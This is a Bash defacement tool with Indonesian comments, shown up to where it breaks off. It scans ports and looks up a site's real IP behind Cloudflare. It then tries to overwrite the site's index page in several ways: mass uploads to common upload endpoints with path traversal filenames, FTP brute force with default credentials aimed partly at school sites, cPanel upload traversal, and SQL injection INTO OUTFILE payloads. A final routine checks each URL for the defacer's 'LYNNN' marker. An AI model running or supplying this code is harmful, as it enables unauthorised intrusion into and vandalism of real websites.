# ==============================================
# FUNGSI CEK TOOLS
# ==============================================
check_tools() {
    echo -e "\n${YELLOW}[â€¢] Checking required tools...${NC}"
    local tools=("curl" "wget" "dig" "nslookup" "ping" "ftp" "timeout")
    local missing=()
    
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            missing+=($tool)
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}âŒ Missing tools: ${missing[*]}${NC}"
        echo -e "${YELLOW}Installing...${NC}"
        apt-get update -y > /dev/null 2>&1
        apt-get install -y ${missing[@]} > /dev/null 2>&1
        echo -e "${GREEN}âœ… Tools installed${NC}"
    else
        echo -e "${GREEN}âœ… All tools available${NC}"
    fi
}

# ==============================================
# FUNGSI SCAN PORT
# ==============================================
scan_ports() {
    local ip=$1
    local results=()
    local ports=(21 22 80 443 2082 2083 2086 2087 2095 2096 3306 5432 8080 8443 8888)
    
    echo -e "\n${CYAN}[â€¢] Scanning ports on $ip...${NC}"
    
    for port in "${ports[@]}"; do
        timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}  âœ… Port $port terbuka${NC}"
            results+=($port)
        fi
    done
    
    echo "${results[@]}"
}

# ==============================================
# FUNGSI BYPASS CLOUDFLARE
# ==============================================
bypass_cloudflare() {
    local domain=$1
    local ip=$2
    
    echo -e "\n${PURPLE}[â€¢] Bypassing Cloudflare...${NC}"
    
    # Cek real IP dari berbagai sumber
    REAL_IP=$(curl -s "https://ipinfo.io/$domain" 2>/dev/null | grep -oE '"ip":"[0-9.]+"' | cut -d'"' -f4)
    
    if [ -z "$REAL_IP" ]; then
        REAL_IP=$(curl -s "https://www.ip2location.com/demo/$domain" 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    fi
    
    if [ -n "$REAL_IP" ] && [ "$REAL_IP" != "$ip" ]; then
        echo -e "${GREEN}  âœ… Real IP found: $REAL_IP${NC}"
        IP="$REAL_IP"
    else
        echo -e "${YELLOW}  âš ï¸ Using original IP: $ip${NC}"
    fi
}

# ==============================================
# FUNGSI UPLOAD MASSAL
# ==============================================
mass_upload() {
    local target=$1
    local ip=$2
    local html_file=$3
    
    # Semua kemungkinan upload endpoint
    local UPLOADS=(
        "/upload.php"
        "/uploads/"
        "/filemanager/upload.php"
        "/admin/upload.php"
        "/assets/upload.php"
        "/inc/upload.php"
        "/includes/upload.php"
        "/api/upload"
        "/uploader.php"
        "/ckeditor/upload.php"
        "/tinymce/upload.php"
        "/fckeditor/upload.php"
        "/summernote/upload.php"
        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        "/wp-content/plugins/file-manager/backend/connector.php"
        "/wp-admin/admin-ajax.php"
        "/admin/ajax.php"
        "/index.php?action=upload"
        "/uploadify.php"
        "/plugins/upload.php"
        "/modules/upload.php"
        "/components/upload.php"
        "/media/upload.php"
        "/images/upload.php"
    )
    
    # Semua lokasi index yang mungkin
    local INDEXES=(
        "public_html/index.html"
        "httpdocs/index.html"
        "htdocs/index.html"
        "www/index.html"
        "var/www/html/index.html"
        "home/public_html/index.html"
        "public/index.html"
        "sites/index.html"
        "sites/main/index.html"
        "sites/default/index.html"
        "html/index.html"
        "static/index.html"
        "assets/index.html"
        "content/index.html"
        "web/index.html"
        "root/index.html"
    )
    
    echo -e "\n${PURPLE}[â€¢] Starting mass upload (${#UPLOADS[@]} endpoints x ${#INDEXES[@]} locations)...${NC}"
    
    local total=$(( ${#UPLOADS[@]} * ${#INDEXES[@]} ))
    local count=0
    
    for upload in "${UPLOADS[@]}"; do
        for index in "${INDEXES[@]}"; do
            count=$((count + 1))
            percent=$((count * 100 / total))
            
            echo -ne "\r${CYAN}  Progress: [$percent%] $count/$total${NC}"
            
            # Upload via domain
            curl -s -k -X POST "$target$upload" \
                -F "file=@$html_file;filename=$index" \
                --max-time 2 >/dev/null 2>&1 &
            
            # Upload via IP
            curl -s -k -X POST "http://$ip$upload" \
                -F "file=@$html_file;filename=$index" \
                -H "Host: $DOMAIN" \
                --max-time 2 >/dev/null 2>&1 &
            
            # Dengan traversal
            TRAVERSAL=$(echo "$index" | sed 's|/|../|g')
            curl -s -k -X POST "$target$upload" \
                -F "file=@$html_file;filename=$TRAVERSAL" \
                --max-time 2 >/dev/null 2>&1 &
            
            # Limit parallel processes
            while [ $(jobs | wc -l) -ge 30 ]; do
                sleep 0.1
            done
        done
    done
    wait
    echo -e "\n${GREEN}  âœ… Mass upload selesai!${NC}"
}

# ==============================================
# FUNGSI FTP BRUTE FORCE
# ==============================================
ftp_brute() {
    local ip=$1
    local html_file=$2
    
    echo -e "\n${PURPLE}[â€¢] FTP Brute Force Attack...${NC}"
    
    local USERS=(
        "anonymous" "ftp" "admin" "root" "user" "web" "www-data" 
        "public" "upload" "webmaster" "school" "sekolah" "smp" "sma" "smk"
    )
    
    local PASSWORDS=(
        "anonymous" "ftp" "admin" "root" "user" "web" "password" 
        "123456" "12345678" "qwerty" "abc123" "school" "sekolah" 
        "smp123" "sma123" "smk123" "toor" "admin123" "ftp123"
    )
    
    local LOCATIONS=(
        "/public_html/index.html"
        "/httpdocs/index.html"
        "/htdocs/index.html"
        "/www/index.html"
        "/var/www/html/index.html"
        "/home/public_html/index.html"
    )
    
    for user in "${USERS[@]}"; do
        for pass in "${PASSWORDS[@]}"; do
            for loc in "${LOCATIONS[@]}"; do
                ftp -n $ip <<EOF > /dev/null 2>&1
quote USER $user
quote PASS $pass
put $html_file $loc
quit
EOF
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}  âœ… FTP Success: $user:$pass -> $loc${NC}"
                fi
            done
        done
    done
}

# ==============================================
# FUNGSI CPANEL EXPLOIT
# ==============================================
cpanel_exploit() {
    local ip=$1
    local html_file=$2
    
    echo -e "\n${PURPLE}[â€¢] cPanel Exploit...${NC}"
    
    local PORTS=(2082 2083 2086 2087 2095 2096)
    local PATHS=(
        "/filemanager/upload"
        "/filemanager/upload.php"
        "/webdav/upload"
        "/cpanel/filemanager/upload"
    )
    
    for port in "${PORTS[@]}"; do
        for path in "${PATHS[@]}"; do
            curl -s -k -X POST "https://$ip:$port$path" \
                -F "file=@$html_file;filename=../../../../public_html/index.html" \
                -H "Host: $DOMAIN" \
                --max-time 5 >/dev/null 2>&1
            
            curl -s -k -X POST "http://$ip:$port$path" \
                -F "file=@$html_file;filename=../../../../public_html/index.html" \
                -H "Host: $DOMAIN" \
                --max-time 5 >/dev/null 2>&1
        done
    done
    echo -e "${GREEN}  âœ… cPanel exploit selesai${NC}"
}

# ==============================================
# FUNGSI SQL INJECTION UPLOAD
# ==============================================
sql_upload() {
    local target=$1
    local html_file=$2
    
    echo -e "\n${PURPLE}[â€¢] SQL Injection Upload...${NC}"
    
    # Convert HTML to hex for SQL injection
    local HEX_HTML=$(cat "$html_file" | xxd -p | tr -d '\n')
    
    local SQL_PATHS=(
        "/wp-login.php"
        "/index.php"
        "/login.php"
        "/admin.php"
        "/user/login"
        "/auth/login"
        "/wp-admin/admin-ajax.php"
    )
    
    local SQL_PAYLOADS=(
        "1' UNION SELECT 0x$HEX_HTML INTO OUTFILE '/var/www/html/index.html'-- -"
        "1' UNION SELECT 0x$HEX_HTML INTO OUTFILE '/home/public_html/index.html'-- -"
        "1' UNION SELECT 0x$HEX_HTML INTO OUTFILE '/httpdocs/index.html'-- -"
        "1' UNION SELECT 0x$HEX_HTML INTO OUTFILE '/public_html/index.html'-- -"
    )
    
    for path in "${SQL_PATHS[@]}"; do
        for payload in "${SQL_PAYLOADS[@]}"; do
            ENCODED=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
            curl -s -k "$target$path?user=$ENCODED" --max-time 3 >/dev/null 2>&1
            curl -s -k -X POST "$target$path" -d "username=$ENCODED&password=test" --max-time 3 >/dev/null 2>&1
        done
    done
    echo -e "${GREEN}  âœ… SQL injection selesai${NC}"
}

# ==============================================
# FUNGSI VERIFIKASI
# ==============================================
verify_deface() {
    local target=$1
    local ip=$2
    
    echo -e "\n${YELLOW}[â€¢] Verifikasi dengan 6 metode...${NC}"
    sleep 2
    
    local success=0
    local methods=()
    
    # Method 1: Via domain
    RESULT1=$(curl -s -k "$target/" --max-time 5 2>/dev/null)
    if [[ "$RESULT1" == *"LYNNN"* ]]; then
        success=1
        methods+=("Domain")
    fi
    
    # Method 2: Via HTTP IP
    RESULT2=$(curl -s -k "http://$ip/" --max-time 5 2>/dev/null)
    if [[ "$RESULT2" == *"LYNNN"* ]]; then
        success=1
        methods+=("HTTP IP")
    fi
    
    # Method 3: Via HTTPS IP
    RESULT3=$(curl -s -k "https://$ip/" --max-time 5 2>/dev/null)
    if [[ "$RESULT3" == *"LYNNN"* ]]; then
        success=1
        methods+=("HTTPS IP")
    fi
    
    # Method 4: Via domain dengan User-Agent
    RESULT4=$(curl -s -k -A "Mozilla/5.0" "$target/" --max-time 5 2>/dev/null)
    if [[ "$RESULT4" == *"LYNNN"* ]]; then
        success=1
        methods+=("Custom UA")
    fi
    
    # Method 5: Via common paths
    RESULT5=$(curl -s -k "$target/index.html" --max-time 5 2>/dev/null)
    if [[ "$RESULT5" == *"LYNNN"* ]]; then
        success=1
        methods+=("Index.html")
    fi
    
    # Method 6: Via port 8080
    RESULT6=$(curl -s -k "http://$ip:8080/" --max-time 5 2>/dev/null)
    if [[ "$RESULT6" == *"LYNNN"* ]]; then
        success=1
        methods+=("Port 8080")
    fi
    
    if [ $success -eq 1 ]; then
        echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
